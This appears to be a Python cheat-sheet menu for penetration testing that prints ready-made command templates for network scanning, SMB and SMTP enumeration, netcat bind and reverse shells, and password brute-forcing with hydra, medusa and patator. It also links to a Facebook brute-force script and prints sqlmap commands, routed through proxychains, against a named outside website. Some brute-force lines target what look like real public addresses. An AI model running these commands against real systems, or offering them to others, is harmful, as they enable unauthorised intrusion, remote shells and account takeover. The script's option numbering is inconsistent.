G = '\x1b[1;32m'
R = '\x1b[31m'

def scan():
    #

    import socket

    G = '\x1b[1;32m'
    R = '\x1b[31m'

    host=input (G+"put your host  :") or "127.0.0.1"
    ip   = socket.gethostbyname(host)

    TCPDUMP='''
    tcpdump -nn -X -v -i wlan0 -s0
    tcpdump -nn {tcp|udp|icmp|arp|ip} {and|or|not} {port} {and|or|not} {dst|src|host} 8.8.8.8
    tcpdump -nn tcp and port 21 and host {0} -i wlan0 -s0 -w ftp.pcapng
    tcpdump -nn -r ftp.pcapng '''



    Wireshark='''
    Wireshark
    ip.addr == {0}
    ip.addr == {0} and http
    http or arp
    ip.addr == {0}and tcp.port == 80 '''.format(host)


    traceroute='''
    traceroute
    ---------
    Linux traceroute use UDP by default
    traceroute -n {0} *UDP
    traceroute -I {0} *ICMP
    traceroute -T {0} *TCP
    Windows tracert use ICMP by default
    tracert -d {0} #ICMP '''.format(host)

    nmap="""
    nmap
    ----
    --data-length=50
    ---------------------
    to see live hosts ping_sweap
    ------------
    nmap -n -sn {0}
    -----
    nmap -n -Pn -sS {0}
    -----
    nmap --top-ports 100 100 {0} 

    nmap -oA filename # to write output in text

    Special options
    ------------------
    nmap --reason {0}
    nmap --badsum {0} #some times it bypass the firewall 

    OS Fingerprinting
    ----------------
    nmap -O {0}
    Version Scanning
    -----------------
    nmap -sV {0}
    nmap -A {0}  #A = -sV -O -sC
    --------------------------
    NMAP Script Engine
    ------------------------------
    ls /usr/share/nmap/scripts/
    *-----------*
    nmap -p 139,445 --script=smb* {0} # star to eun all scripts with name smb
    --------------------------------------
    nmap -sC {0}
    nmap --script=http-robots.txt.nse -p80 {0}
    nmap -p 80 --script=http-vuln-cve2010-2861.nse {0}
    nmap -p 21 --script=ftp-anon.nse {0}
    nmap -p 139,445 --script=smb-security-mode.nse {0}
    nmap --script=smb-os-discovery.nse {0}
    nmap --script=dns-zone-transfer -p 53 {1}""".format(ip,host)


    SMB='''
    SMB enumerate -port 139 |445 you can enumerat users
    -------------------------------------------
    NULL Session
    -------------
    rpcclient -U "" -N {0}   
    #-U for empty usersr to  search for user type :
    enumdomusers
    ----------
    queryuser xxxx
    ------------
    Session with username and password

    rpcclient -U "test" {0} '''.format(host)

    Enum4Linux='''
    Enum4Linux
    ---------
    enum4linux {0}
    enum4linux -u "test" -p "test" {0} '''.format(host)

    SMTP='''
    SMTP ENUMERATE
    --------------
    telnet {0} 25
    VRFY msfadmin
    smtp-user-enum -M VRFY -U users.txt -t {0}
    '''.format(host)

    netcat=''''

    Find open ports
    nc -nv {0} 21
    nc -vz {0} 21
    nc -v {0} 21
    timeout 1 nc -v {0} 21

    Chat using nc
    -------------------
    nc -nlvp 4444 #on server
    nc -nv {0} 4444 #on client

    Bind shell
    -------
    nc -nlvp 4444 -e /bin/bash (cmd.exe) #on target
    nc -nv {0} 4444 #on attacker

    Reverse shell
    ----------------
    nc -nlvp 4444 #on attacker
    nc -nv {0} 4444 -e /bin/bash (cmd.exe) #on target3

    ncat --exec /bin/bash (cmd.exe) --allow {0} -vnl 4444 --ssl
    ncat -v {0} 4444 --ssl


    nc -nlvp 4444 > wget (wget.exe) #Victim Machine
    nc -nv 127.0.0.1 4444 < /usr/bin/wget (/usr/share/windows_binaries/wget.exe) #Kali Machine

    '''.format(ip)




    Nessus='''
    \033[33m
    https://www.tenable.com/downloads/nessus
    dpkg -i Nessus-6.9.4-debian6_amd64.deb

    service nessusd start
    -----------------------
    update-rc.d nessusd enable
    ----------
    https://localhost:8834/ '''
    options=['1-TCPDUMP','2-Wireshark','3-traceroute','4-nmap',"4-SMB",'5-Enum4Linux','6-SMTP',"7-netcat","8-Nessus","*"]
    for i in options:    print(i)


    while 1 :

      
        opt=input (R+"put your option pls :"+G)
        if opt=="1":
            print(TCPDUMP)
        elif opt=="2":
                print(Wireshark)
        elif opt=="3":
            print(traceroute)
        elif opt=="4":
                print(nmap)
        elif opt=="5":
                print(Enum4Linux)
        elif opt=="6":
                print(SMTP)
        elif opt=="7":
                print(netcat)
        elif opt=="8":
                print(Nessus)
        elif opt=="*":
            exit()

def crack():

    options=['1-patator','2-hydra','3-medusa',"4-facebook",'5-raibow_tabel',"*"]
    for i in options:    print(i)
    raibow_tabel= '''https://www.geeksforgeeks.org/understanding-rainbow-table-attack/ '''

    facebook="https://raw.githubusercontent.com/Cesar-Hacker/facebook-brute/master/facebook.py?fbclid=IwAR3raWhPBGbHj3QeLF1_DyiXYStYj3LltJZMsA8D-rFqeCw5pt_aUzaZDuk"
    patator='''patator ftp_login host=192.168.43.64 user=FILE0 password=FILE1   0=/usr/share/wordlists/rockyou.txt 1=/usr/share/wordlists/rockyou.txt-x ignore:mesg="Login incorrect."#'''

    hydra='''hydra -l msfadmin -P /usr/share/wordlists/re.txt 192.168.1.105 -t 4 ssh

    hydra -l root -P /usr/share/wordlists/rockyou.txt  ftp://192.168.43.64    

    hydra -l root -P /usr/share/wordlists/rockyou.txt  51.159.64.76 -t 4 ssh

    hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
    hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
    hydra -l admin -p password ftp://[192.168.0.0/24]/
    hydra -L logins.txt -P pws.txt -M targets.txt ssh'''
    
    medusa='''
    single user name
    # medusa -u msfadmin -P passes.txt -h 192.168.43.64 -M ssh
    FOR FILES
    # medusa -U passes.txt -P passes.txt -h 192.168.43.64 -M ssh 
         
    # medusa -U passes.txt -P passes.txt -h 192.168.43.64 -M ftp'''
            
    
    x=input ("put choicec :")
    if x=="1":
        print(patator)
    elif x=="2":
            print(hydra)
    elif x=="3":
        print(medusa)
    elif x=="4":
        print(facebook)
    elif x=="5":
        print(raibow_tabel)


############################################################
def database ():
    
    options=["1-sqlmap","2-cewl"]
    for i in options:    print(i)

    sqlmap='''proxychains sqlmap -u http://photo.infrastellar.net/country.php?id=1%27 --dbs
    proxychains sqlmap -u http://photo.infrastellar.net/country.php?id=1%27 --dbms'''



    cewl="cewl https://127.0.0.1"

    x=input ("put choicec :")
    if x=="1":
        print(sqlmap)
    elif x=="2":
            print(cewl)
###########################
def scans():
    options=['1-scan','2-crack','3-database',"*"]
    for i in options:    print(i)

    if 1 :

        opt=input (R+"put your option pls :"+G)
        if opt=="1":
            scan()
        elif opt=="2":
            crack()
        elif opt=="3":
            database()
        elif opt=="*":
            exit()
